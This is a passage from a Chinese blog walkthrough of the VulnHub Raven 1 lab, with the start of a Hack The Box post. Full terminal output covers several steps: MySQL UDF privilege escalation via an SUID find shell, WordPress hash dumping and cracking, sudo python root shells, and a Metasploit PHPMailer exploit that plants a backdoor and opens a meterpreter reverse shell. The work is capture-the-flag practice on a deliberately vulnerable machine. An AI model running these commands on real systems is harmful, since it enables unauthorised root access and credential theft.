<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/tmp/1518.so&#x27;</span>));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;1518.so&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select do_system(<span class="string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| do_system(<span class="string">&#x27;chmod u+s /usr/bin/find&#x27;</span>) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    0 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>现在，遍历目录/tmp并使用find程序执行命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">michael@Raven:/tmp$ touch raj</span><br><span class="line">michael@Raven:/tmp$ find raj -<span class="built_in">exec</span> <span class="string">&quot;whoami&quot;</span> \;</span><br><span class="line">root</span><br><span class="line">michael@Raven:/tmp$ find raj -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1000(michael) gid=1000(michael) euid=0(root) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">flag4.txt</span><br><span class="line"><span class="comment"># cat flag4.txt </span></span><br><span class="line">______                      </span><br><span class="line"></span><br><span class="line">| ___ \                     </span><br><span class="line"></span><br><span class="line">| |_/ /__ ___   _____ _ __  </span><br><span class="line"></span><br><span class="line">|    // _` \ \ / / _ \ <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">| |\ \ (_| |\ V /  __/ | | |</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\_| \_\__,_| \_/ \___|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            </span></span><br><span class="line"><span class="string">flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CONGRATULATIONS on successfully rooting Raven!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is my first Boot2Root VM - I hope you enjoyed it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hit me up on Twitter and let me know what you thought: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@mccannwj / wjmccann.github.io</span></span><br></pre></td></tr></table></figure>

<p>到这一步找到了第二个flag</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub212.jpg"></p>
<h3 id="提权方法二"><a href="#提权方法二" class="headerlink" title="提权方法二"></a>提权方法二</h3><p>如上所述到达MySQL Shell，然后采用替代方法。查看所有数据库，并从“WordPress”数据库中的wp_users表中转储用户名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; use wordpress;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wordpress   |</span><br><span class="line">+-----------------------+</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">12 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+</span><br><span class="line">| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+</span><br><span class="line">|  1 | michael    | <span class="variable">$P</span><span class="variable">$BjRvZQ</span>.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |</span><br><span class="line">|  2 | steven     | <span class="variable">$P</span><span class="variable">$Bk3VD9jsxx</span>/loJoqNsURgHiaB23j7W/ | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>发现了两个哈希值，但是由于已经知道了Michael的密码，因此使用hashcat通过将哈希值粘贴到名为“password.txt”的文本文件中来破解了Steven的密码。<br>由于gpu性能太强，一秒出密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\hashcat-5.1.0\hashcat-5.1.0&gt;hashcat64.exe -a 0 -m 400 password.txt D:/wordlists/rockyou.txt</span><br><span class="line">hashcat (v5.1.0) starting...</span><br><span class="line"></span><br><span class="line">* Device <span class="comment">#1: WARNING! Kernel exec timeout is not disabled.</span></span><br><span class="line">             This may cause <span class="string">&quot;CL_OUT_OF_RESOURCES&quot;</span> or related errors.</span><br><span class="line">             To <span class="built_in">disable</span> the timeout, see: https://hashcat.net/q/timeoutpatch</span><br><span class="line">* Device <span class="comment">#2: Intel&#x27;s OpenCL runtime (GPU only) is currently broken.</span></span><br><span class="line">             We are waiting <span class="keyword">for</span> updated OpenCL drivers from Intel.</span><br><span class="line">             You can use --force to override, but <span class="keyword">do</span> not report related errors.</span><br><span class="line">nvmlInit(): Unknown Error</span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#1: NVIDIA Corporation</span></span><br><span class="line">======================================</span><br><span class="line">* Device <span class="comment">#1: GeForce GTX 1070, 2048/8192 MB allocatable, 16MCU</span></span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#2: Intel(R) Corporation</span></span><br><span class="line">========================================</span><br><span class="line">* Device <span class="comment">#2: Intel(R) UHD Graphics 630, skipped.</span></span><br><span class="line">* Device <span class="comment">#3: Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, skipped.</span></span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) OpenCL kernels selected.</span><br><span class="line">This enables cracking passwords and salts &gt; length 32 but <span class="keyword">for</span> the price of drastically reduced performance.</span><br><span class="line">If you want to switch to optimized OpenCL kernels, append -O to your commandline.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: D:/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344360</span><br><span class="line">* Bytes.....: 139921318</span><br><span class="line">* Keyspace..: 14344360</span><br><span class="line"></span><br><span class="line"><span class="variable">$P</span><span class="variable">$Bk3VD9jsxx</span>/loJoqNsURgHiaB23j7W/:pink84</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: phpass, WordPress (MD5), phpBB3 (MD5), Joomla (MD5)</span><br><span class="line">Hash.Target......: <span class="variable">$P</span><span class="variable">$Bk3VD9jsxx</span>/loJoqNsURgHiaB23j7W/</span><br><span class="line">Time.Started.....: Fri Feb 14 19:47:16 2020 (1 sec)</span><br><span class="line">Time.Estimated...: Fri Feb 14 19:47:17 2020 (0 secs)</span><br><span class="line">Guess.Base.......: File (D:/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:  1114.4 kH/s (7.11ms) @ Accel:512 Loops:128 Thr:64 Vec:1</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts</span><br><span class="line">Progress.........: 524288/14344360 (3.66%)</span><br><span class="line">Rejected.........: 0/524288 (0.00%)</span><br><span class="line">Restore.Point....: 0/14344360 (0.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:8064-8192</span></span><br><span class="line">Candidates.<span class="comment">#1....: 123456 -&gt; chadj85</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: N/A</span></span><br><span class="line"></span><br><span class="line">Started: Fri Feb 14 19:47:10 2020</span><br><span class="line">Stopped: Fri Feb 14 19:47:19 2020</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub213.jpg"></p>
<p>得到密码为pink84</p>
<p>当然也可以用john来破解，更加的方便，但是所需时间更长</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/raven1<span class="comment"># john hash</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (phpass [phpass (<span class="variable">$P</span>$ or <span class="variable">$H</span>$) 256/256 AVX2 8x3])</span><br><span class="line">Cost 1 (iteration count) is 8192 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Almost <span class="keyword">done</span>: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">Proceeding with incremental:ASCII</span><br><span class="line">pink84           (?)</span><br><span class="line">1g 0:00:01:17 DONE 3/3 (2020-02-14 06:52) 0.01287g/s 47616p/s 47616c/s 47616C/s poslus..pingar</span><br><span class="line">Use the <span class="string">&quot;--show --format=phpass&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>登录到steven的shell并运行sudo -l命令，发现Python不需要root权限即可运行。因此，使用python的单行代码生成了python PTY shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">michael@Raven:/tmp$ su steven</span><br><span class="line">Password: </span><br><span class="line">$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> steven on raven:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User steven may run the following commands on raven:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/python</span><br><span class="line">$ sudo python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">root@Raven:/tmp<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@Raven:/tmp<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@Raven:/tmp<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>可以看到成功的提升到了root权限的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Raven:/tmp<span class="comment"># find / -name &quot;flag*&quot; 2&gt;/dev/null</span></span><br><span class="line">/var/www/flag2.txt</span><br><span class="line">/root/flag4.txt</span><br><span class="line">/usr/share/doc/apache2-doc/manual/tr/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/ja/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/ko/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/zh-cn/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/de/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/es/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/da/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/pt-br/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/fr/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/en/rewrite/flags.html</span><br><span class="line">/sys/devices/pci0000:00/0000:00:11.0/net/eth0/flags</span><br><span class="line">/sys/devices/virtual/net/lo/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS0/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags</span><br></pre></td></tr></table></figure>

<p>发现还是只有两个flag文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/www/flag2.txt</span><br><span class="line">/root/flag4.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub214.jpg"></p>
<h3 id="继续寻找剩下的两个flag"><a href="#继续寻找剩下的两个flag" class="headerlink" title="继续寻找剩下的两个flag"></a>继续寻找剩下的两个flag</h3><p>通过目录扫描发现下面的url</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.118/service.html</span><br></pre></td></tr></table></figure>

<p>右键查看源码，发现flag</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub215.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!-- flag1&#123;b9bbcb33e11b80be759c4e844862482d&#125; --&gt;</span><br></pre></td></tr></table></figure>

<p>还剩下最后一个flag，再次连接数据库，进入数据库查找</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Raven:~<span class="comment"># mysql -uroot -pR@v3nSecurity</span></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 74</span><br><span class="line">Server version: 5.5.60-0+deb8u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use wordpress;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wordpress   |</span><br><span class="line">+-----------------------+</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">12 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from wp_posts;</span><br><span class="line">+----+-------------+---------------------+---------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+--------------+-------------+----------------+-------------+---------------+---------------+---------+--------+---------------------+---------------------+-----------------------+-------------+------------------------------------------------------------------+------------+-----------+----------------+---------------+</span><br><span class="line">| ID | post_author | post_date           | post_date_gmt       | post_content                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | post_title   | post_excerpt | post_status | comment_status | ping_status | post_password | post_name     | to_ping | pinged | post_modified       | post_modified_gmt   | post_content_filtered | post_parent | guid                                                             | menu_order | post_type | post_mime_type | comment_count |</span><br><span class="line">+----+-------------+---------------------+---------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+--------------+-------------+----------------+-------------+---------------+---------------+---------+--------+---------------------+---------------------+-----------------------+-------------+------------------------------------------------------------------+------------+-----------+----------------+---------------+</span><br><span class="line">|  1 |           1 | 2018-08-12 22:49:12 | 2018-08-12 22:49:12 | Welcome to WordPress. This is your first post. Edit or delete it, <span class="keyword">then</span> start writing!                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   | Hello world! |              | publish     | open           | open        |               | hello-world   |         |        | 2018-08-12 22:49:12 | 2018-08-12 22:49:12 |                       |           0 | http://192.168.206.131/wordpress/?p=1                            |          0 | post      |                |             1 |</span><br><span class="line">|  2 |           1 | 2018-08-12 22:49:12 | 2018-08-12 22:49:12 | This is an example page. It<span class="string">&#x27;s different from a blog post because it will stay in one place and will show up in your site navigation (in most themes). Most people start with an About page that introduces them to potential site visitors. It might say something like this:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;blockquote&gt;Hi there! I&#x27;</span>m a miner by day, aspiring actor by night, and this is my website. I live <span class="keyword">in</span> Kalgoorlie, have a great dog named Red, and I like yabbies. (And gettin<span class="string">&#x27; a tan.)&lt;/blockquote&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">...or something like this:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;blockquote&gt;The XYZ Doohickey Company was founded in 1971, and has been providing quality doohickeys to the public ever since. Located in Gotham City, XYZ employs over 2,000 people and does all kinds of awesome things for the Gotham community.&lt;/blockquote&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">As a new WordPress user, you should go to &lt;a href=&quot;http://192.168.206.131/wordpress/wp-admin/&quot;&gt;your dashboard&lt;/a&gt; to delete this page and create new pages for your content. Have fun! | Sample Page  |              | publish     | closed         | open        |               | sample-page   |         |        | 2018-08-12 22:49:12 | 2018-08-12 22:49:12 |                       |           0 | http://192.168.206.131/wordpress/?page_id=2                      |          0 | page      |                |             0 |</span></span><br><span class="line"><span class="string">|  4 |           1 | 2018-08-13 01:48:31 | 0000-00-00 00:00:00 | flag3&#123;afc01ab56b50591e7dccf93122770cd2&#125;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | flag3        |              | draft       | open           | open        |               |               |         |        | 2018-08-13 01:48:31 | 2018-08-13 01:48:31 |                       |           0 | http://raven.local/wordpress/?p=4                                |          0 | post      |                |             0 |</span></span><br><span class="line"><span class="string">|  5 |           1 | 2018-08-12 23:31:59 | 2018-08-12 23:31:59 | flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | flag4        |              | inherit     | closed         | closed      |               | 4-revision-v1 |         |        | 2018-08-12 23:31:59 | 2018-08-12 23:31:59 |                       |           4 | http://raven.local/wordpress/index.php/2018/08/12/4-revision-v1/ |          0 | revision  |                |             0 |</span></span><br><span class="line"><span class="string">|  7 |           2 | 2018-08-13 01:48:31 | 2018-08-13 01:48:31 | flag3&#123;afc01ab56b50591e7dccf93122770cd2&#125;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | flag3        |              | inherit     | closed         | closed      |               | 4-revision-v1 |         |        | 2018-08-13 01:48:31 | 2018-08-13 01:48:31 |                       |           4 | http://raven.local/wordpress/index.php/2018/08/13/4-revision-v1/ |          0 | revision  |                |             0 |</span></span><br><span class="line"><span class="string">+----+-------------+---------------------+---------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+--------------+-------------+----------------+-------------+---------------+---------------+---------+--------+---------------------+---------------------+-----------------------+-------------+------------------------------------------------------------------+------------+-----------+----------------+---------------+</span></span><br><span class="line"><span class="string">5 rows in set (0.00 sec)</span></span><br></pre></td></tr></table></figure>

<p>最后一个flag,flag3终于找到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag3&#123;afc01ab56b50591e7dccf93122770cd2&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub216.jpg"></p>
<h3 id="使用msf进行getshell的方法"><a href="#使用msf进行getshell的方法" class="headerlink" title="使用msf进行getshell的方法"></a>使用msf进行getshell的方法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/http/phpmailer_arg_injection) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/phpmailer_arg_injection):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   Proxies                      no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS      192.168.56.118   yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT       80               yes       The target port (TCP)</span><br><span class="line">   SSL         <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI   /contact.php     yes       Path to the application root</span><br><span class="line">   TRIGGERURI  /                no        Path to the uploaded payload</span><br><span class="line">   VHOST                        no        HTTP server virtual host</span><br><span class="line">   WEB_ROOT    /var/www/html    yes       Path to the web root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.56.102   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   PHPMailer &lt;5.2.18</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/http/phpmailer_arg_injection) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.102:4444 </span><br><span class="line">[*] Writing the backdoor to /var/www/html/XTXxkX1w.php</span><br><span class="line">[*] Sleeping before requesting the payload from: /XTXxkX1w.php</span><br><span class="line">[*] Waiting <span class="keyword">for</span> up to 300 seconds to trigger the payload</span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.56.118</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.56.102:4444 -&gt; 192.168.56.118:34607) at 2020-02-14 08:02:30 -0500</span><br><span class="line">[+] Deleted /var/www/html/XTXxkX1w.php</span><br><span class="line">[+] Successfully triggered the payload</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer    : Raven</span><br><span class="line">OS          : Linux Raven 3.16.0-6-amd64 <span class="comment">#1 SMP Debian 3.16.57-2 (2018-07-14) x86_64</span></span><br><span class="line">Meterpreter : php/linux</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 17423 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">ls</span><br><span class="line">Security - Doc</span><br><span class="line">about.html</span><br><span class="line">contact.php</span><br><span class="line">contact.zip</span><br><span class="line">css</span><br><span class="line">elements.html</span><br><span class="line">fonts</span><br><span class="line">img</span><br><span class="line">index.html</span><br><span class="line">js</span><br><span class="line">scss</span><br><span class="line">service.html</span><br><span class="line">team.html</span><br><span class="line">vendor</span><br><span class="line">wordpress</span><br></pre></td></tr></table></figure>

<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>phpmailer漏洞getshell</li>
<li>wordpress用户名泄露</li>
<li>mysql udf提权</li>
<li>python suid提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[Smasher2]</title>
    <url>/2019/12/26/Smasher2/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><font color="red">注意：本博客每一篇博客仅作记录供本人日后查阅。</font></p>
<p>难度：疯狂<br>点数：50<br>发布日期：2019年6月01日<br>IP:10.10.10.135</p>
<p>user.txt和root.txt的一血分别用了07小时13分55秒，20小时29分49秒，真够疯狂的。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1.jpg"></li>
<li><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></li>
</ul>
<a id="more"></a>

<h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3><p>注册hack the box需要邀请码，无非就是找到注册api然后解密两次，很简单,参考网址<span class="exturl" data-url="aHR0cHM6Ly9jb2RlYnVyc3QuaW8vaGFjay10aGUtYm94LWhvdy10by1nZXQtaW52aXRlLWNvZGUtNTZlMzY5ZmM4ZGFl">Hack The Box: How to get invite code<i class="fa fa-external-link-alt"></i></span>根据教程一步一步走就能获得注册码了，英文不好的小朋友自行谷歌翻译。</p>
<h3 id="准备入坑-Hack-The-Box"><a href="#准备入坑-Hack-The-Box" class="headerlink" title="准备入坑[Hack The Box]"></a>准备入坑[Hack The Box]</h3><p>htb的每一个靶场需要vpn连接才能使用，按照下图根据说明下载.ovpn文件，然后下载openvpn连接客户端，社区免费版下载网址<span class="exturl" data-url="aHR0cHM6Ly9vcGVudnBuLm5ldC9jb21tdW5pdHktZG93bmxvYWRzLw==">Openvpn Community Downloads<i class="fa fa-external-link-alt"></i></span>,下载安装完成后导入.ovpn文件点击连接即可打开靶机的网址。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2.jpg"></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>老规矩上nmap</p>
